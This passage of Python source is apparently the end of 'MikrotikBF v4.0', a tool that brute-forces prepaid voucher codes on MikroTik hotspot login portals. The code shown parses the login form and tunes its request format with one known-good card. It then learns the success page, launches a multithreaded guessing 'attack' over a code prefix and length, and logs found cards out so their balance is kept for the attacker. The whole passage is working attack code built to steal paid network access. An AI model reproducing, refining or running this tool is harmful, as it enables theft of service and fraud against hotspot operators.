        mm = re.search(r'method\s*=\s*["\'](\w+)["\']', tag, re.I)
        if mm:
            info['method'] = mm.group(1).lower()
    for im in re.finditer(r'<input\b[^>]*>', html_text, re.I):
        tag = im.group(0)
        nm = re.search(r'name\s*=\s*["\']?([\w\-.]+)', tag, re.I)
        if not nm:
            continue
        name = nm.group(1)
        vm = re.search(r'value\s*=\s*["\']([^"\']*)["\']', tag, re.I)
        info['fields'][name] = vm.group(1) if vm else ''
    # v4.0: field detection in two passes - the old one misfired because the
    # type regex kept the quote and the default 'username' blocked detection.
    infos = []
    for im in re.finditer(r'<input\b[^>]*>', html_text, re.I):
        tag = im.group(0)
        nm = re.search(r'name\s*=\s*["\']?([\w\-.]+)', tag, re.I)
        if not nm:
            continue
        tm = re.search(r'type\s*=\s*["\']?(\w+)', tag, re.I)
        infos.append((nm.group(1), (tm.group(1).lower() if tm else '')))
    pwd = next((n for n, t in infos if t == 'password'), None)
    if pwd is None:
        pwd = next((n for n, t in infos
                    if any(w in n.lower() for w in ('pass', 'pwd'))), None)
    if pwd:
        info['pass_field'] = pwd
    usr = next((n for n, t in infos
                if n != pwd and t in ('text', 'tel', 'number', 'email')), None)
    if usr is None:
        usr = next((n for n, t in infos
                    if n != pwd and any(w in n.lower()
                                        for w in ('user', 'login'))), None)
    if usr:
        info['user_field'] = usr
    return info


def diagnose_flow():
    """v3.9: one known-good card is tried with every sensible combination of
    (password value x dst value). Each case prints one diagnosis line, so the
    working configuration is found instead of guessed."""
    print(f'''{yellow}
 +---------------------------------------------+
 |  SELF-TEST with one card you KNOW works     |
 |  The tool reads the login page by itself,   |
 |  then tries every password/dst combination. |
 +---------------------------------------------+{white}''')
    raw = input(f'{white} -> Login URL {green}(ex: http://t.com/login){white} : ')
    url = normalize_url(raw)
    if not url:
        return
    card = input(f' -> A card/code you know is VALID {green}(works in the browser){white} : ').strip()
    if not card:
        print(f'{red} * Nothing entered.{white}')
        return
    s = requests.Session()
    try:
        r = s.get(url, timeout=(CONNECT_TIMEOUT, READ_TIMEOUT), verify=False,
                  allow_redirects=True)
    except Exception as e:
        kind, short = classify_error(e)
        print(f'{red} * Cannot open the login page [{kind}]: {short}{white}')
        input(f'{gray} Enter to continue...{white}')
        return
    s.close()
    page_url = r.url or url
    form = parse_login_form(r.text or '', page_url)
    login_url = form['action']
    method = '2' if form['method'] == 'post' else '1'

    q = parse_qs(urlparse(page_url).query)
    dst_candidates, seen = [], set()
    for src in (q.get('dst', [None])[0], form['fields'].get('dst'), ''):
        if src is not None and src not in seen:
            seen.add(src)
            dst_candidates.append(src)

    skip = {form['user_field'].lower(), form['pass_field'].lower(),
            'dst', 'popup'}
    fixed = {k: v for k, v in form['fields'].items() if k.lower() not in skip}

    print(f'\n {cyan}* login page read  : form action = {login_url} '
          f'({form["method"].upper()}){white}')
    print(f' {cyan}* username field   : {form["user_field"]}   |   '
          f'password field : {form["pass_field"]}{white}')
    print(f' {cyan}* form fields found: '
          f'{", ".join(f"{k}={v!r}" for k, v in form["fields"].items()) or "none"}{white}')
    print(f' {cyan}* fixed fields kept: '
          f'{", ".join(f"{k}={v!r}" for k, v in fixed.items()) or "none"}{white}')
    print(f' {cyan}* dst values to try: '
          f'{[d if d else "(empty)" for d in dst_candidates]}{white}')
    print(f'\n {yellow}CASES - one line each, watch for SUCCESS or '
          f'DIFFERENT:{white}')

    p_base = {'login_url': login_url, 'method': method,
              'user_field': form['user_field'],
              'pass_field': form['pass_field'],
              'extras': True, 'dst_field': 'dst', 'popup_field': 'popup',
              'pass_mode': 'empty', 'fixed_fields': fixed,
              'success_url_contains': 'msftconnecttest.com'}
    pass_modes = [('same', 'same as card'), ('empty', 'empty'),
                  ('md5user', 'md5(username)'), ('omit', 'field omitted')]
    wrong = '0' * len(card) if card.strip('0') else '1' * len(card)
    results = []
    likely = []
    for pm, label in pass_modes:
        for dst in dst_candidates:
            p = dict(p_base)
            p['pass_mode'] = pm
            p['dst_value'] = dst
            s1 = requests.Session()
            _warm_session(s1, p)
            tmo = (CONNECT_TIMEOUT, READ_TIMEOUT)
            try:
                resp = _raw_send(s1, p, card, card, tmo)
                wresp = _raw_send(s1, p, wrong, wrong, tmo)
            except Exception as e:
                kind, short = classify_error(e)
                print(f'  {red}pass={label:<14} dst={dst or "(empty)":<44} -> '
                      f'ERROR [{kind}] {short}{white}')
                s1.close()
                continue
            ok = is_successful(p, resp, '')
            body = resp.text or ''
            wbody = wresp.text or ''
            loc = resp.headers.get('Location') or ''
            if ok:
                verdict = f'{green}SUCCESS{white}'
                results.append((pm, dst))
            elif resp.status_code == wresp.status_code and body == wbody:
                verdict = f'{gray}same reply as a wrong card{white}'
            else:
                words = _distinct_words(body, wbody)
                likely.append((pm, dst, words))
                verdict = (f'{green}DIFFERENT reply (len {len(body)}) - the '
                           f'portal ACCEPTED this card (login likely '
                           f'happened!){white}')
            extra = f' Loc={loc}' if loc else ''
            print(f'  pass={label:<14} dst={(dst or "(empty)"):<44} -> '
                  f'HTTP {resp.status_code}{extra} | {verdict}')
            s1.close()

    print()
    num_of = {'same': '1', 'empty': '2', 'omit': '3', 'md5user': '5'}
    if not results and likely:
        results = [(pm, dst) for pm, dst, _ in likely]
    if results:
        pm, dst = results[0]
        words = next((w for a, b, w in likely if (a, b) == (pm, dst)), [])
        num = num_of[pm]
        print(f' {green}* WORKING SETTING FOUND - create a profile '
              f'(menu 2) with these answers:{white}')
        print(f'   - Login URL            : {url}')
        print(f'   - Method               : {method}')
        print(f'   - Username field       : {form["user_field"]}')
        print(f'   - Password field       : {form["pass_field"]}')
        shape = ('2 (username = password)' if pm == 'same'
                 else '1 (username only)')
        print(f'   - Type (network shape) : {shape}')
        print(f'   - dst value            : {dst if dst else "(leave empty)"}')
        print(f'   - Password value       : {num}  ({pm})')
        print(f'   - Extra fixed fields   : '
              f'{", ".join(f"{k}={v}" for k, v in fixed.items()) or "(none)"}')
        print(f'   - Success URL contains : msftconnecttest.com')
        if words:
            print(f'   - Success Keyword      : {words[0]}')
            print(f'     (other candidates: {", ".join(words[1:])})')
        print(f' {yellow}* If SUCCESS was not printed above, the portal answers '
              f'HTTP 200 with a big page instead of a redirect.{white}')
        print(f' {yellow}  In menu 2, answer y to "Teach me the SUCCESS page now?"'
              f' and give it this same card - it learns the page shape.{white}')
    else:
        print(f' {yellow}! No combination succeeded for that card.{white}')
        print(f' {gray}  -> In the browser: F12 -> Network tab -> log in once '
              f'-> click the login request ->{white}')
        print(f' {gray}     send its "Form Data" and Request Headers '
              f'(especially the Cookie line).{white}')
    input(f'{gray} Enter to continue...{white}')


def send_logout(p, url=None, session=None):
    """v4.0: POST the portal's logout URL (the status page the user pasted
    has <form action=".../logout">) so a card that was just used for a test
    or a found match gets released and its balance preserved."""
    lo = url or p.get('logout_url') or urljoin(p['login_url'], '/logout')
    s = session or requests.Session()
    try:
        return s.post(lo, data={}, timeout=(CONNECT_TIMEOUT, READ_TIMEOUT),
                      verify=False, allow_redirects=False)
    except Exception:
        return None


def quick_mode_flow():
    """v4.0 QUICK MODE: five questions, everything else is automatic.
    1) login URL  2) a known-good card  3) prefix  4) full length
    5) attempts. The tool reads the login page, tunes the password/dst
    setting with the known card, learns the success page, logs the known
    card out, saves the profile and starts the attack."""
    print(f'''{yellow}
 +---------------------------------------------+
 |  QUICK MODE - 5 questions, the rest is auto |
 |  You only need ONE card that works.         |
 +---------------------------------------------+{white}''')
    p = {}
    if not ask_url_and_test(p):
        return
    card = input(f'{white} -> A card you KNOW works {green}(logs in with the browser){white} : ').strip()
    if not card:
        print(f'{red} * Cancelled - QUICK MODE needs one known-good card.{white}')
        input(f'{gray} Enter to continue...{white}')
        return
    prefix = input(f' -> Card prefix {green}(Enter if none){white} : ').strip()
    length = ask_int(f'{white} -> Full card length : ', minv=1, maxv=64)
    var = length - len(prefix)
    if var <= 0:
        print(f'{red} * Prefix is longer than the full length!{white}')
        input(f'{gray} Enter to continue...{white}')
        return

    print(f'\n {yellow}> Reading the login page...{white}')
    s = requests.Session()
    try:
        r = s.get(p['login_url'], timeout=(CONNECT_TIMEOUT, READ_TIMEOUT),
                  verify=False, allow_redirects=True)
    except Exception as e:
        kind, short = classify_error(e)
        print(f'{red} * Cannot open the login page [{kind}]: {short}{white}')
        input(f'{gray} Enter to continue...{white}')
        return
    s.close()
    page_url = r.url or p['login_url']
    form = parse_login_form(r.text or '', page_url)
    p['method'] = '2' if form['method'] == 'post' else '1'
    p['user_field'] = form['user_field']
    p['pass_field'] = form['pass_field']
    q = parse_qs(urlparse(page_url).query)
    dsts, seen = [], set()
    for src in (q.get('dst', [None])[0], form['fields'].get('dst'), ''):
        if src is not None and src not in seen:
            seen.add(src)
            dsts.append(src)
    skip = {form['user_field'].lower(), form['pass_field'].lower(),
            'dst', 'popup'}
    p['extras'] = True
    p['dst_field'] = 'dst'
    p['popup_field'] = 'popup'
    p['fixed_fields'] = {k: v for k, v in form['fields'].items()
                         if k.lower() not in skip}
    p['network_type'] = '1'
    p['charset'] = CHARSETS['1']
    p['var_len'] = var
    p['prefix'] = prefix
    p['suffix'] = ''
    p['guess_mode'] = '2'
    p['threads'] = 10
    p['keyword'] = ''
    print(f' {green}* method {form["method"].upper()} | user field '
          f'"{form["user_field"]}" | pass field "{form["pass_field"]}" | '
          f'hidden fields: {len(p["fixed_fields"])}{white}')

    print(f' {yellow}> Tuning with the known card (a few seconds)...{white}')
    tmo = (CONNECT_TIMEOUT, READ_TIMEOUT)
    wrong = '0' * len(card) if card.strip('0') else '1' * len(card)
    chosen = None
    for pm in ('same', 'empty', 'md5user', 'omit'):
        for dst in dsts:
            p2 = dict(p)
            p2['pass_mode'] = pm
            p2['dst_value'] = dst
            s1 = requests.Session()
            _warm_session(s1, p2)
            try:
                resp = _raw_send(s1, p2, card, card, tmo)
                wresp = _raw_send(s1, p2, wrong, wrong, tmo)
            except Exception:
                s1.close()
                continue
            good = is_successful(p2, resp, '') or (
                _normalize_page(resp.text or '', (card, card))
                != _normalize_page(wresp.text or '', (wrong, wrong)))
            if good:
                chosen = (pm, dst, resp, wresp, s1)
                break
            s1.close()
        if chosen:
            break
    if not chosen:
        print(f' {red}* No setting made the known card work. Open F12 -> '
              f'Network on a real browser login and send the Form Data.'
              f'{white}')
        input(f'{gray} Enter to continue...{white}')
        return
    pm, dst, ok_resp, w_resp, s1 = chosen
    p['pass_mode'] = pm
    p['dst_value'] = dst
    if pm == 'same':
        p['network_type'] = '2'
    print(f' {green}* Setting found: password mode "{pm}", dst '
          f'{"(empty)" if not dst else dst}{white}')

    sig = extract_signature(ok_resp.text or '', w_resp.text or '')
    if sig:
        p['success_signature'] = sig
        print(f' {green}* Success page learned. Words: '
              f'{", ".join(sig[:6])}{white}')
    else:
        print(f' {yellow}! Could not extract signature words - the tool will '
              f'rely on the page-difference detection (still works).{white}')
    p['success_url'] = ok_resp.url or ''
    m = re.search(r'<form[^>]+action=["\']?([^"\' >]*logout[^"\' >]*)',
                  ok_resp.text or '', re.I)
    p['logout_url'] = urljoin(ok_resp.url or page_url, m.group(1)) \
        if m else urljoin(p['login_url'], '/logout')

    lo = send_logout(p, session=s1)
    s1.close()
    print(f' {green}* Known card logged out (balance preserved) - '
          f'HTTP {lo.status_code if lo is not None else "?"}{white}')

    db = load_db()
    names = {pr['name'] for pr in db['profiles']}
    name = 'quick'
    n = 2
    while name in names:
        name = f'quick{n}'
        n += 1
    p['name'] = name
    p['created'] = datetime.now().strftime('%Y-%m-%d %H:%M')
    p['last_used'] = p['created']
    db['profiles'].append(p)
    save_db(db)
    print(f' {green}* Profile saved as "{name}".{white}')

    space = _profile_space(p)
    dflt = space if space <= 2_000_000 else None
    hint = f'space {fmt_int(space)}'
    if dflt:
        hint += f', Enter = cover all {fmt_int(dflt)}'
    count = ask_int(f'{white} -> Attempts {green}({hint}){white} : ',
                    default=dflt)
    shared = attack(p, count, p['threads'], '')
    show_result(shared, p, p['threads'])
    p['walk'] = shared.get('walk')
    _persist_tried(p, shared)
    save_db(load_db() if False else db)
    if shared.get('found') and shared.get('user'):
        lo2 = send_logout(p)
        print(f' {green}* Found card logged out too - its balance is '
              f'safe.{white}')


def main():
    clear_screen()
    print(f'''{green}
  =============================================
{white}   MikrotikBF v4.0
{white}   Developer : ENG.YOUSEF
{green}  ============================================={gray}{green}
''')

    while True:
        print(f'''{cyan}
  +---------------- Main Menu -----------------+{white}
   1) QUICK MODE - 5 questions, all automatic {green}(recommended){white}
   2) Use saved profile      {white}
   3) Full setup - all questions (advanced) {white}
   4) Manage profiles        {white}
   5) Fetch portal scripts (md5.js / doLogin) {white}
   6) SELF-TEST a known-good card (diagnosis only) {white}
   0) Exit
{cyan}  +-------------------------------------------+{white}''')
        c = input(f'{white} -> choice : ').strip()
        if c == '1':
            quick_mode_flow()
        elif c == '2':
            use_profile_flow()
        elif c == '3':
            create_profile_flow()
        elif c == '4':
            manage_profiles_flow()
        elif c == '5':
            fetch_scripts_flow()
        elif c == '6':
            diagnose_flow()
        elif c in ('0', 'q', 'exit'):
            print(f'\n {green}Bye.{white}')
            break
        else:
            print(f'{red} * Invalid choice.{white}')
    try:
        input(f'{gray} Press [Enter] to close...{white}')
    except KeyboardInterrupt:
        pass


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        pass
